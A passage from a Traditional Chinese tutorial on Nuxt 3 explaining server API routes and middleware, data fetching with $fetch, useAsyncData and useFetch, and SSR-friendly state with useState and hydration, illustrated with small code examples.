目錄中。\n舉例來說，以下的檔案結構會產生兩個可以訪問的伺服器 API 路由，分別為 /api/hello 及 /api/world。\n1 2 3 4 5 6 nuxt-app/ └── server/ ├── api/ │ └── hello.js └── routes/ └── world.js 匹配路由參數 將檔案名稱添加中括號 []，其中放入欲設定的參數名稱，以此來處理動態路由匹配。 舉例來說，建立 ./server/api/hello/[name].js 檔案，內容如下：\nserver/api/hello/[name].js 1 2 3 4 export default defineEventHandler((event) =\u0026gt; { const { name } = event.context.params return `Hello, ${name}!` }) 在 handler 內就能使用 event.context.params 來訪問 name 路由參數。\n匹配 HTTP 請求方法 (HTTP Request Method) 我們可以添加 .get、.post、.put 或 .delete 等檔案名稱後綴，來匹配對應的 HTTP request methods。\n新增 server/api/test.get.js，內容如下：\nserver/api/test.get.js 1 2 3 4 5 6 export default defineEventHandler(() =\u0026gt; { return { ok: true, message: \u0026#39;測試 [GET] /api/test\u0026#39; } }) 新增 server/api/test.post.js，內容如下：\nserver/api/test.post.js 1 2 3 4 5 6 export default defineEventHandler((event) =\u0026gt; { return { ok: true, message: \u0026#39;測試 [POST] /api/test\u0026#39; } }) 我們使用 Postman 來打這兩隻 API，可以看到使用不同的 HTTP Request Method，就會匹配至對應後綴檔案中的 handler 進行處理。\n[GET] /api/test [POST] /api/test 從上面的例子，我們建立了 test.get.js 與 test.post.js 檔案，分別對應了 GET 與 POST 方法，如果同一個路由使用了其他方法而無法匹配處理的檔案時，則會回傳 HTTP 狀態碼 405 Method Not Allowed 表示錯誤。\n匹配包羅萬象的路由 (Catch-all Route) 你可以建立 […].js 的檔案，來將所有不匹配的路由交由這個 handler 作處理。\n例如，建立 ./server/api/catch-all/[…].js，將可以匹配 /api/catch-all/x、/api/catch-all/x/y\u0026hellip;等 /catch-all 下所有層級的路由。\nserver/api/catch-all/[…].js 1 2 3 4 5 6 7 8 9 export default defineEventHandler((event) =\u0026gt; { return { ok: true, data: { url: event.req.url }, message: \u0026#39;/api/catch-all 下不匹配的路由都會進入這裡\u0026#39; } }) 建立 ./server/api/[…].js 檔案如下，將可以接手所有 /api 下無法匹配的路由。\nserver/api/[…].js 1 2 3 4 5 6 7 8 9 export default defineEventHandler(() =\u0026gt; { return { ok: true, data: { url: event.req.url }, message: \u0026#39;/api 下不匹配的路由都會進入這裡\u0026#39; } }) 下圖示範中，當我們輸入的路由如果沒有辦法處理，將會被 [...].js 所匹配，以此我們可以來實作返回、重新導向或錯誤頁面。\n伺服器中間件 Nuxt 會自動載入 ./server/middleware 中的檔案，並添加至伺服器中間件，伺服器的中間件與路由中間件不同的是，pages 路由頁面的請求是不會執行伺服器中間件。\n伺服器的中間件會在每個 Request 進入伺服器 API 的路由前執行，通常用來添加或檢查請求的標頭 (headers)、記錄請求或擴展調整請求的物件。\n伺服器中間件的處理邏輯，不應該回傳任何內容，也不應中斷或直接回應請求，伺服器中間件應該僅檢查、擴展請求上下文或直接拋出錯誤。\n舉理來說，你可以新增 ./server/middleware/log.js 用來記錄每個請求的 URL。\nserver/middleware/log.js 1 2 3 export default defineEventHandler((event) =\u0026gt; { console.log(\u0026#39;New request: \u0026#39; + event.req.url) }) 或者，新增 ./server/middleware/auth.js 用來解析請求或擴展請由物件。\nserver/middleware/auth.js 1 2 3 export default defineEventHandler((event) =\u0026gt; { event.context.auth = { username: \u0026#39;ryan\u0026#39; } }) 伺服器插件 Nuxt 會自動掃描並載入 ./server/plugins 目錄下的檔案，並將他們註冊為 Nitro 的插件，在 Nitro 啟動時，這些插件將會在伺服器載入並執行，插件允許擴展 Nitro 執行時的行為及連接到生命週期的事件。\n更多細節可以參考 Nitro Plugins。\n伺服器通用功能 Nuxt 中伺服器的路由，是由 unjs/h3 所提供，h3 內建一些方便實用的 helpers，可以參考 Available H3 Request Helpers。\n伺服器路由常用的 HTTP 請求處理 處理 HTTP 請求中的 Body 1 2 3 4 5 6 7 export default defineEventHandler(async (event) =\u0026gt; { const body = await readBody(event) return { ok: true, data: body } }) 可以使用 readBody(event) 來解析請求中的 Body，注意 readBody() 是一個異步函數，記得 await 等待解析完成。\n處理 URL 中的查詢參數 (Query Parameters) 可以使用 getQuery(evnet) 來解析查詢參數。\n1 2 3 4 5 6 7 8 9 export default defineEventHandler((event) =\u0026gt; { const query = getQuery(event) return { ok: true, data: { name: query.name } } }) 當請求 URL 為 /api/query?name=ryan，可以解析出查詢參數 query.name。\n解析 HTTP 請求所夾帶的 Cookie 可以使用 parseCookies(event) 來解析請求所夾帶的 Cookie。\n1 2 3 4 5 6 7 8 9 export default defineEventHandler((event) =\u0026gt; { const cookies = parseCookies(event) return { ok: true, data: { cookies } } }) 我透過瀏覽器的開發工具，手動添加了一組 cookie 名為 token，Server API 可以透過 parseCookies() 來解析出瀏覽器自動夾帶的 cookie。\n進階使用範例 Nitro 配置 你可以在 nuxt.config.ts 中使用 nitro 屬性來配置 Nitro 設定。\nnuxt.config.ts 1 2 3 4 export default defineNuxtConfig({ // https://nitro.unjs.io/config nitro: {} }) 使用巢狀路由 你可以直接使用 h3 的 createRouter() 方法來建立巢狀路由。\n1 2 3 4 5 6 7 import { createRouter } from \u0026#39;h3\u0026#39; const router = createRouter() router.get(\u0026#39;/\u0026#39;, () =\u0026gt; \u0026#39;Hello World\u0026#39;) export default router 伺服器儲存 Nitro 提供了一個跨平台的儲存層，你可以 Nitro 的配置中設定 storage 屬性，來配置額外的儲存掛載位置，官網提供了一個使用 Redis 的範例。\n更多 Nitro 伺服器的設定與使用可以參考官網。\nNitro 伺服器引擎將 Nuxt 3 提升至另一個境界，不僅功能強大且讓開發中擁有不錯的體驗，伺服器路由更是能在後端直接處理邏輯實作 Server API，而接下來將介紹如何在 Nuxt 打 API 取得資料。\n資料獲取 (Data Fetching) Nuxt 提供了 $fetch 及四種組合式函數 (Composables)，來進行資料獲取，也就是說，我們不需要再額外安裝任何 HTTP Client ，如 axios 來發送 HTTP 請求，因為 Nuxt 本身就自帶了打 API 的方法，而且在頁面、元件或插件中都能直接呼叫做使用，非常方便。\n首先，我們先介紹一下 $fetch 這個由 Nuxt 提供使用 ohmyfetch 套件所封裝的 helper，$fetch 可以在 Nuxt 中用於發送 HTTP 請求。\n如果在伺服器端渲染的期間，呼叫 $fetch 打內部 API 路由，也就是打我們自己在 ./server 下實作的後端 API，那麼因為使用 $fetch 的關係，Nuxt 會模擬請求，改由直接呼叫內部 API 的處理函數，這樣就能節省額外的 API 呼叫。\n使用的方法，如下：\n1 $fetch(url, options) 我們可以使用 $fetch(\u0026rsquo;/api/count\u0026rsquo;) 建立一個 GET 請求，發送至 /api/count 後會返回一個 Promise，完成後我們就可以接收回傳的資料。\n$fetch 的 options 的參數及建立攔截器等功能可以參考 ohmyfetch，不過呢，我們還會使用 Nuxt 提供的組合函數結合 $fetch 來打 API。\n接下來我們就來依序介紹，如何使用 Nuxt 提供的四種組合函數來從 API 獲取資料。\nuseAsyncData 這個 useAsyncData() 組合函數，其實不是傳入 URL 直接呼叫就會發出 API 請求，而是 Nuxt 可以透過這個函數來添加異步請求資料的邏輯。\nuseAsyncData 組合函數能接收 key、handler 與 options，其中 handler 會來添加請求異步資料的邏輯。當我們在頁面、元件和插件中呼叫 useAsyncData，並等待回傳的 Promise，我們的頁面或元件的渲染將會阻塞路由載入至 handler 異步邏輯處理完畢後才會繼續執行，也就是說，整個頁面元件將會等待所有使用 useAsyncData 呼叫的 API 回傳完成後才會開始進行渲染。\n舉個例子，我們新增一個 Server API，並稍微添加一下延遲，模擬 API 約需要處理 2 秒才回傳資料，./server/api/count.js 內容如下：\nserver/api/count.js 1 2 3 4 5 6 7 8 9 let counter = 0 export default defineEventHandler(async () =\u0026gt; { await new Promise((resolve) =\u0026gt; setTimeout(resolve, 2 * 1000)) // 等待 2 秒 counter += 1 return JSON.stringify(counter) }) 新增一個路由頁面，./pages/count/useAsyncData.vue 內容如下：\npages/count/useAsyncData.vue 1 2 3 4 5 6 7 8 9 10 \u0026lt;template\u0026gt; \u0026lt;div class=\u0026#34;my-24 flex flex-col items-center\u0026#34;\u0026gt; \u0026lt;p class=\u0026#34;text-4xl text-gray-600\u0026#34;\u0026gt;瀏覽次數\u0026lt;/p\u0026gt; \u0026lt;span class=\u0026#34;mt-4 text-6xl font-semibold text-sky-400\u0026#34;\u0026gt;{{ data }}\u0026lt;/span\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;script setup\u0026gt; const { data } = await useAsyncData(\u0026#39;count\u0026#39;, () =\u0026gt; $fetch(\u0026#39;/api/count\u0026#39;)) \u0026lt;/script\u0026gt; 當我們瀏覽 /count/useAsyncData 時，會打 /api/count 這隻 API，並等待返回後才開始渲染元件。\n因為瀏覽 http://localho:3000/count/useAsyncData 時，第一次都是由後端渲染處理，看不太出導航有被阻塞的效果，建議可以添加一下路由連結來進行導航，就可以發現差異。\n當我們從首頁，由客戶端導航至 /count/useAsyncData 頁面時，會發現網址的路由已經變化，但是頁面約等了一會兒才渲染出現，這就是因為頁面中使用了 useAsyncData() 來獲取資料，await 將阻塞整個頁面元件的載入與渲染，直至 API 處理完畢回傳後才開始載入路由渲染元件。\nuseAsyncData() 共有兩種呼叫時使用參數差異，可以選擇是否傳入第一個參數 key，所傳入參數的類型如下\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 function useAsyncData( handler: (nuxtApp?: NuxtApp) =\u0026gt; Promise\u0026lt;DataT\u0026gt;, options?: AsyncDataOptions\u0026lt;DataT\u0026gt; ): AsyncData\u0026lt;DataT\u0026gt; function useAsyncData( key: string, handler: (nuxtApp?: NuxtApp) =\u0026gt; Promise\u0026lt;DataT\u0026gt;, options?: AsyncDataOptions\u0026lt;DataT\u0026gt; ): Promise\u0026lt;AsyncData\u0026lt;DataT\u0026gt;\u0026gt; type AsyncDataOptions\u0026lt;DataT\u0026gt; = { server?: boolean lazy?: boolean default?: () =\u0026gt; DataT | Ref\u0026lt;DataT\u0026gt; | null transform?: (input: DataT) =\u0026gt; DataT pick?: string[] watch?: WatchSource[] initialCache?: boolean immediate?: boolean } interface RefreshOptions { _initial?: boolean } type AsyncData\u0026lt;DataT, ErrorT\u0026gt; = { data: Ref\u0026lt;DataT | null\u0026gt; pending: Ref\u0026lt;boolean\u0026gt; execute: () =\u0026gt; Promise\u0026lt;void\u0026gt; refresh: (opts?: RefreshOptions) =\u0026gt; Promise\u0026lt;void\u0026gt; error: Ref\u0026lt;ErrorT | null\u0026gt; } useAsyncData() 傳入的參數 key：唯一鍵，可以確保資料不會重複的獲取，也就是如果 Key 相同便不會再發送相同的請求，除非重新整理頁面由後端再次渲染獲取，或呼叫 useAsyncData 回傳的 refresh() 函數重新取得資料。 handler：回傳異步請求資料的處理函數，打 API 或加工的異步邏輯都可以在這裡處理。 options： server：是否在伺服器端獲取資料，預設為 true。 lazy：是否於載入路由後才開始執行異步請求函數，預設為 false，所以會阻止路由載入直到請求完成後才開始渲染頁面元件。 default：當傳入這個 factory function，可以將異步請求發送與回傳解析前，設定資料的預設值，對於設定 lazy: true 選項特別有用處，至少有個預設值可以使用及渲染顯示。 transform：修改加工 handler 回傳結果的函數。 pick：handler 若回傳一個物件，只從中依照需要的 key 取出資料，例如只從 JSON 物件中取的某幾個 key 組成新的物件。 watch：監聽 ref 或 reactive 響應式資料發生變化時，觸發重新請求資料，適用於資料分頁、過濾結果或搜尋等情境。 initialCache：預設為 true，當第一次請求資料時，將會把有效的 payload 快取，之後的請求只要是相同的 key，都會直接回傳快取的結果。 immediate：預設為 true，請求將會立即觸發。 useAsyncData() 的回傳值 data：傳入異步函數的回傳結果。 pending：以 true 或 false 表示是否正在獲取資料。 refresh / execute：一個函數，可以用來重新執行 handler 函數，回傳新的資料，類似重新整理、重打一次 API 的概念。預設情況下 refresh() 執行完並回傳後才能再次執行。 error：資料獲取失敗時回傳的物件。 看到這裡，我們再重新閱讀與解釋 useAsyncData() 的範例\n1 2 3 4 5 6 \u0026lt;script setup\u0026gt; const { data, pending, error, refresh } = await useAsyncData( \u0026#39;count\u0026#39;, () =\u0026gt; $fetch(\u0026#39;/api/count\u0026#39;) ) \u0026lt;/script\u0026gt; 呼叫 useAsyncData() 並不是直接幫我們送出 HTTP 請求，而是在 handler 內使用 $fetch 來打 API，只是 useAsyncData() 組合式函數，封裝了更多打 API 時可以使用的方法與參數，來因應不同的使用情境。當然如果想要，你也可以使用其他套件來替換 $fetch 但可能就沒辦法享受它所帶來的好處。\nuseFetch 這個組合式函數將 useAsyncData 和 $fetch 進行包裝，當使用這個函數時它會根據 URL 和 fetch 的選項來自動產生 useAsyncData 需要的參數 key，如果呼叫的 API 是伺服器端所提供的，也會自動根據伺服器 API 路由來為請求提供類型提示，並推斷 API 的回傳類型。\nuseFetch() 所傳入參數的類型如下\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 function useFetch( url: string | Request | Ref\u0026lt;string | Request\u0026gt; | () =\u0026gt; string | Request, options?: UseFetchOptions\u0026lt;DataT\u0026gt; ): Promise\u0026lt;AsyncData\u0026lt;DataT\u0026gt;\u0026gt; type UseFetchOptions = { key?: string method?: string params?: SearchParams body?: RequestInit[\u0026#39;body\u0026#39;] | Record\u0026lt;string, any\u0026gt; headers?: { key: string, value: string }[] baseURL?: string server?: boolean lazy?: boolean immediate?: boolean default?: () =\u0026gt; DataT transform?: (input: DataT) =\u0026gt; DataT pick?: string[] watch?: WatchSource[] initialCache?: boolean } type AsyncData\u0026lt;DataT\u0026gt; = { data: Ref\u0026lt;DataT\u0026gt; pending: Ref\u0026lt;boolean\u0026gt; refresh: () =\u0026gt; Promise\u0026lt;void\u0026gt; execute: () =\u0026gt; Promise\u0026lt;void\u0026gt; error: Ref\u0026lt;Error | boolean\u0026gt; } useFetch() 傳入的參數 url：要獲取資料的 URL 或 API Endpoint。 options：(繼承自 unjs/ohmyfetch 選項與 AsyncDataOptions) method：發送 HTTP 請求的方法，例如 GET、POST 或 DELETE 等。 params：查詢參數 (Query params)。 body：請求的 body，可以傳入一個物件，它將自動被轉化為字串。 headers：請求的標頭 (headers)。 baseURL：請求的 API 路徑，基於的 URL。 options：(繼承自 useAsyncData 的選項) key：唯一鍵，可以確保資料不會重複的獲取，也就是如果 Key 相同便不會再發送相同的請求，除非重新整理頁面由後端再次渲染獲取，或呼叫 useAsyncData 回傳的 refresh() 函數重新取得資料。 server：是否在伺服器端獲取資料，預設為 true。 lazy：是否於載入路由後才開始執行異步請求函數，預設為 false，所以會阻止路由載入直到請求完成後才開始渲染頁面元件。 immediate：預設為 true，請求將會立即觸發。 default：當傳入這個 factory function，可以將異步請求發送與回傳解析前，設定資料的預設值，對於設定 lazy: true 選項特別有用處，至少有個預設值可以使用及渲染顯示。 transform：修改加工 handler 回傳結果的函數。 pick：handler 若回傳一個物件，只從中依照需要的 key 取出資料，例如只從 JSON 物件中取的某幾個 key 組成新的物件。 watch：監聽 ref 或 reactive 響應式資料發生變化時，觸發重新請求資料，適用於資料分頁、過濾結果或搜尋等情境。 initialCache：預設為 true，當第一次請求資料時，將會把有效的 payload 快取，之後的請求只要是相同的 key，都會直接回傳快取的結果。 useFetch() 的回傳值 data：傳入異步函數的回傳結果。 pending：以 true 或 false 表示是否正在獲取資料。 refresh / execute：一個函數，可以用來重新執行 handler 函數，回傳新的資料，類似重新整理、重打一次 API 的概念。預設情況下 refresh() 執行完並回傳後才能再次執行。 error：資料獲取失敗時回傳的物件。 舉個例子，我們新增一個 Server API，./server/api/about.js 內容如下：\nserver/api/about.js 1 2 3 4 5 6 7 8 9 10 11 12 let counter = 0 export default defineEventHandler(() =\u0026gt; { counter += 1 return { name: \u0026#39;Ryan\u0026#39;, gender: \u0026#39;男\u0026#39;, email: \u0026#39;ryanchien8125@gmail.com\u0026#39;, counter } }) 新增一個路由頁面，./pages/about/useFetch.vue 內容如下：\npages/about/useFetch.vue 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 \u0026lt;template\u0026gt; \u0026lt;div class=\u0026#34;my-24 flex flex-col items-center\u0026#34;\u0026gt; \u0026lt;p class=\u0026#34;text-2xl text-gray-600\u0026#34;\u0026gt; 請求狀態: {{ pending ? \u0026#39;請求中\u0026#39; : \u0026#39;完成\u0026#39; }} \u0026lt;/p\u0026gt; \u0026lt;span v-if=\u0026#34;error\u0026#34; class=\u0026#34;mt-4 text-6xl text-gray-600\u0026#34;\u0026gt;是否錯誤: {{ error }}\u0026lt;/span\u0026gt; \u0026lt;span class=\u0026#34;mt-4 text-2xl text-gray-600\u0026#34;\u0026gt;回傳資料:\u0026lt;/span\u0026gt; \u0026lt;p class=\u0026#34;mt-4 text-3xl font-semibold text-blue-500\u0026#34;\u0026gt;{{ data }}\u0026lt;/p\u0026gt; \u0026lt;button class=\u0026#34;mt-6 rounded-sm bg-blue-500 py-3 px-8 text-xl font-medium text-white hover:bg-blue-600 focus:outline-none focus:ring-2 focus:ring-blue-400 focus:ring-offset-2\u0026#34; @click=\u0026#34;refresh\u0026#34; \u0026gt; 重新獲取資料 \u0026lt;/button\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;script setup\u0026gt; const { data, pending, error, refresh } = await useFetch(\u0026#39;/api/about\u0026#39;, { pick: [\u0026#39;name\u0026#39;, \u0026#39;counter\u0026#39;] }) \u0026lt;/script\u0026gt; 透過 useFetch() 我們能更簡單的發送 API 請求，並能得到狀態與重新獲取資料的函數，甚至在第一次進入頁面時，利用 $fetch 可以直接呼叫伺服器 API 函數的特性來降低 API 的請求次數。\n攔截器 我們也可以透過 $fetch 提供的選項來設置攔截器。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 const { data, pending, error, refresh } = await useFetch(\u0026#39;/api/auth/login\u0026#39;, { onRequest({ request, options }) { // 設定請求時夾帶的標頭 options.headers = options.headers || {} options.headers.authorization = \u0026#39;...\u0026#39; }, onRequestError({ request, options, error }) { // 處理請求時發生的錯誤 }, onResponse({ request, response, options }) { // 處理請求回應的資料 return response._data }, onResponseError({ request, response, options }) { // 處理請求回應發生的錯誤 } }) useLazyAsyncData 預設的情況下，useAsyncData() 的 options.lazy 為 false，意思是，預設得情況下，當進入路由後，會開始執行異步請求函數，並會會阻止路由載入元件等，直到請求完成後才開始渲染頁面元件。\nuseLazyAsyncData() 則是 options.lazy 預設為 true 的封裝，也就是請求資料時它將不會阻塞，並讓頁面繼續渲染元件。\n舉個例子，我們新增一個 Server API，並稍微添加一下延遲，模擬 API 約需要處理 2 秒才回傳資料，./server/api/count.js 內容如下：\nserver/api/count.js 1 2 3 4 5 6 7 8 9 let counter = 0 export default defineEventHandler(async () =\u0026gt; { await new Promise((resolve) =\u0026gt; setTimeout(resolve, 2000)) // 等待 2 秒 counter += 1 return JSON.stringify(counter) }) 新增一個路由頁面，./pages/count/useLazyAsyncData.vue 內容如下：\npages/count/useLazyAsyncData.vue 1 2 3 4 5 6 7 8 9 10 11 12 13 \u0026lt;template\u0026gt; \u0026lt;div class=\u0026#34;my-24 flex flex-col items-center\u0026#34;\u0026gt; \u0026lt;p class=\u0026#34;text-6xl text-gray-600\u0026#34;\u0026gt;瀏覽次數\u0026lt;/p\u0026gt; \u0026lt;span class=\u0026#34;mt-4 text-9xl font-semibold text-sky-400\u0026#34;\u0026gt;{{ data }}\u0026lt;/span\u0026gt; \u0026lt;div class=\u0026#34;mt-8\u0026#34;\u0026gt; \u0026lt;NuxtLink to=\u0026#34;/count\u0026#34;\u0026gt;回首頁\u0026lt;/NuxtLink\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;script setup\u0026gt; const { data } = useLazyAsyncData(\u0026#39;count\u0026#39;, () =\u0026gt; $fetch(\u0026#39;/api/count\u0026#39;)) \u0026lt;/script\u0026gt; 可以發現，我們使用 useLazyAsyncData() 後，會與前面使用 useAsyncData() 的效果不一樣，會先渲染出元件，即看到的文字「瀏覽次數」，並再 API 回傳後才響應資料重新渲染數值。\n透過 default 選項可以來建立 API 回傳前的預設值，在 options.lazy 為 true 的情況下，都建議設定一下預設值，可以讓使用者體驗更好一些。\n添加 default 選項，./pages/count/useLazyAsyncData.vue 內容如下：\npages/count/useLazyAsyncData.vue 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 \u0026lt;template\u0026gt; \u0026lt;div class=\u0026#34;my-24 flex flex-col items-center\u0026#34;\u0026gt; \u0026lt;p class=\u0026#34;text-6xl text-gray-600\u0026#34;\u0026gt;瀏覽次數\u0026lt;/p\u0026gt; \u0026lt;span class=\u0026#34;mt-4 text-9xl font-semibold text-sky-400\u0026#34;\u0026gt;{{ data }}\u0026lt;/span\u0026gt; \u0026lt;div class=\u0026#34;mt-8\u0026#34;\u0026gt; \u0026lt;NuxtLink to=\u0026#34;/\u0026#34;\u0026gt;回首頁\u0026lt;/NuxtLink\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;script setup\u0026gt; const { data } = useLazyAsyncData(\u0026#39;count\u0026#39;, () =\u0026gt; $fetch(\u0026#39;/api/count\u0026#39;), { default: () =\u0026gt; \u0026#39;-\u0026#39; }) \u0026lt;/script\u0026gt; 在 API 請求回來前，預設值會是 -。\nuseLazyFetch 如同 useLazyAsyncData 所描述，useLazyFetch 則是 useFetch 的 options.lazy 選項預設為 true 的封裝。\n重新獲取資料 前面有提到我們可以使用 refresh() 來重新獲取具有不同查詢參數的資料。\nrefreshNuxtData 你也可以透過 refreshNuxtData 來使 useAsyncData、useLazyAsyncData、useFetch 與 useLazyFetch 的快取失效，再觸發刷新資料。\n1 2 3 4 5 6 7 8 9 10 11 12 \u0026lt;template\u0026gt; \u0026lt;div\u0026gt; {{ pending ? \u0026#39;Loading\u0026#39; : count }} \u0026lt;/div\u0026gt; \u0026lt;button @click=\u0026#34;refresh\u0026#34;\u0026gt;Refresh\u0026lt;/button\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;script setup\u0026gt; const { pending, data: count } = useLazyAsyncData(\u0026#39;count\u0026#39;, () =\u0026gt; $fetch(\u0026#39;/api/count\u0026#39;)) const refresh = () =\u0026gt; refreshNuxtData(\u0026#39;count\u0026#39;) \u0026lt;/script\u0026gt; Nuxt 已經為我們封裝好可以打 API 的組合函數，用起來也相當簡單方便，照著官網範例及 ohmyfetch 套件的說明，相信很快就能上手。\n狀態管理 (State Management) Vue 3 父子元件間資料傳遞與讀寫或是跨元件間的狀態共享，可以選擇使用 Props / Emit、Provide / Inject 或 Vuex store 來處理，這三種資料流都不大一樣，我們也會依據情境來決定狀態管理的方式。這邊會針對 Nuxt 3 所提供的組合式函數 useState 來講述元件間的共享狀態，應該如何做定義，以及使用 Pinia 替代 Vuex 來做狀態管理。\nHydration 首先，我們先來看一個例子，建立 ./pages/random.vue 內容如下：\npages/random.vue 1 2 3 4 5 6 7 8 9 10 11 \u0026lt;template\u0026gt; \u0026lt;div class=\u0026#34;bg-white py-24\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;flex flex-col items-center\u0026#34;\u0026gt; \u0026lt;span class=\u0026#34;text-9xl font-semibold text-sky-400\u0026#34;\u0026gt;{{ count }}\u0026lt;/span\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;script setup\u0026gt; const count = ref(Math.round(Math.random() * 1000)) \u0026lt;/script\u0026gt; 頁面呈現出，每次重新整理頁面，頁面會顯示新的亂數：\n細心你的可能會發現，每次重整頁面，數字好像變化了兩次，圖中數字停留在 517，重新整理網頁後竟然先變成了 163 後再變成 101。\n這個現象其實是伺服器端渲染後與客戶端再次渲染所導致的。講的白話一點就是，因為 Nuxt 預設的渲染模式 Universal Rendering 在 SSR 時期，將 random.vue 內容於伺服器端渲染完成後亂出產生出 163 作為初始值，意即 const count = ref(163)，所以網頁先顯示了 163 這個數字，同時，瀏覽器的背景也正在下載客戶端所需要的 JS 準備接手做 CSR，當 JS 載入完成後又再一次的執行 Vue 元件的 const count = ref(Math.round(Math.random() * 1000)) 這段程式碼，此時亂數產生了 101 這個數字，客戶端也就重新渲染出了 101 於頁面上，這也就是為什麼每次重新整理數字會變化兩次的原因。\nNuxt 預設的通用渲染 (Universal Rendering) 模式，是結合了 SSR 與 CSR 的技術，在 Nuxt 收到網頁請求後，會在伺服器渲染出 HTML 回傳至瀏覽器渲染顯示出靜態頁面，同時開始載入需要的 Vue 程式碼，讓客戶端接手為 SPA 使得網頁具有互動性，接手後的渲染行為都是在客戶端進行的 CSR，這也就讓通用渲染同時兼具 SSR 對 SEO 的友善以及 CSR 良好互通性的使用者體驗。\n這種在瀏覽器中使後端渲染出的靜態頁面具有交互性，稱之為「Hydration」。\n依據官網所提供的圖片，我添加了一些文字來幫助理解。前述提到了在伺服器渲染網頁 HTML 給瀏覽器時，使用可以正常的看見網頁，但是在 JS 下載完成之前，網頁是不具有互動性的，也就是還不具有路由跳轉等 Vue 互動邏輯，直至 JS 下載完後會 Hydrate Vue 程式碼，這時客戶端就完全接手後續的互動與 CSR，到這邊 Hydration 完成，我們也就能與網站完整的互動了。\n回到一開始的例子，我們在瀏覽器打開開發者工具的主控台 (Console)，可以發現到其實開發的過程，也出現了錯誤提示「Hydration completed but contains mismatches.」，告訴我們 Hydration 完成了但是包含了不匹配，正是前端與後端初始值不同的錯誤。\n接下來我們將介紹 Nuxt 提供的組合式函數 useState，來可以解決這個問題。\nNuxt 3 的狀態管理 (State Management) Nuxt 提供了一個組合式函數 useState 用來建立具有響應式及對於 SSR 友善的共享狀態。\n在前面的例子我們提到因為 Hydration 而導致前後端的初始值可能不一致，而 useState 是一個對 SSR 友善的 ref 替代品，使用 useState 建立的響應式變數，它的值會在伺服器端渲染後與客戶端 Hydration 期間的得以被保留。\nuseState 有兩種接收不同數量參數的呼叫方式：\n1 2 useState\u0026lt;T\u0026gt;(init?: () =\u0026gt; T | Ref\u0026lt;T\u0026gt;): Ref\u0026lt;T\u0026gt; useState\u0026lt;T\u0026gt;(key: string, init?: () =\u0026gt; T | Ref\u0026lt;T\u0026gt;): Ref\u0026lt;T\u0026gt; key：唯一鍵，用於確保資料能被正確請求且不重複。 init：用於提供的初始值給 State 的函數，這個函數也可以回傳一個 ref。 舉個例子，新增 ./pages/count.vue，內容如下：\npages/count.vue 1 2 3 4 5 6 7 8 9 10 11 \u0026lt;template\u0026gt; \u0026lt;div class=\u0026#34;bg-white py-24\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;flex flex-col items-center\u0026#34;\u0026gt; \u0026lt;span class=\u0026#34;text-9xl font-semibold text-emerald-400\u0026#34;\u0026gt;{{ count }}\u0026lt;/span\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;script setup\u0026gt; const count = useState(\u0026#39;count\u0026#39;, () =\u0026gt; Math.round(Math.random() * 1000)) \u0026lt;/script\u0026gt; 可以發現，使用 useState 初始化 count 的值後，瀏覽器重整頁面，就不像前面的例子會發生兩次的數值變動。\n當我們使用 useState 並以 count 當作 key，在網頁請求進入伺服器端執行時，還沒有這個 count 狀態，所以執行了初始化函數產生出一個亂數，例如 888 就會回傳給 count 當作響應式變數的初始值，此時這個網頁請求，已經有一個 count 的響應式狀態，當前端於 Hydration 步驟再次的執行了下面這段程式碼，useState 一樣是以 count 當作 key，但是存在了一個由伺服器端建立好的 count，就會直接使用該狀態，也就不會在執行初始化函數，而導致前後端的初始狀態不一致的問題。\n1 const count = useState(\u0026#39;count\u0026#39;, () =\u0026gt; Math.round(Math.random() * 1000)) useState 的基本用法 新增 ./pages/counter/increment.vue，內容如下：\npages/counter/increment.vue 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 \u0026lt;template\u0026gt; \u0026lt;div class=\u0026#34;bg-white py-24\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;flex flex-col items-center\u0026#34;\u0026gt; \u0026lt;span class=\u0026#34;text-9xl font-semibold text-sky-600\u0026#34;\u0026gt;{{ counter }}\u0026lt;/span\u0026gt; \u0026lt;div class=\u0026#34;mt-8 flex flex-row\u0026#34;\u0026gt; \u0026lt;button class=\u0026#34;font-base mx-2 rounded-full bg-sky-500 px-4 py-2 text-xl text-white hover:bg-sky-600 focus:outline-none focus:ring-2 focus:ring-sky-400 focus:ring-offset-2\u0026#34; @click=\u0026#34;counter++\u0026#34; \u0026gt; 增加 \u0026lt;/button\u0026gt; \u0026lt;button class=\u0026#34;font-base mx-2 rounded-full bg-sky-500 px-4 py-2 text-xl text-white hover:bg-sky-600 focus:outline-none focus:ring-2 focus:ring-sky-400 focus:ring-offset-2\u0026#34; @click=\u0026#34;counter--\u0026#34; \u0026gt; 減少 \u0026lt;/button\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;p class=\u0026#34;mt-4 text-slate-500\u0026#34;\u0026gt;如果是第一次進入這個頁面，數值初始設定為 0\u0026lt;/p\u0026gt; \u0026lt;div class=\u0026#34;mt-8\u0026#34;\u0026gt; \u0026lt;NuxtLink to=\u0026#34;/\u0026#34;\u0026gt;回首頁\u0026lt;/NuxtLink\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;script setup\u0026gt; const counter = useState(\u0026#39;counter\u0026#39;, () =\u0026gt; 0) \u0026lt;/script\u0026gt; 我們使用 useState 並以 counter 當作 key，首次於後端渲染時會初始化為 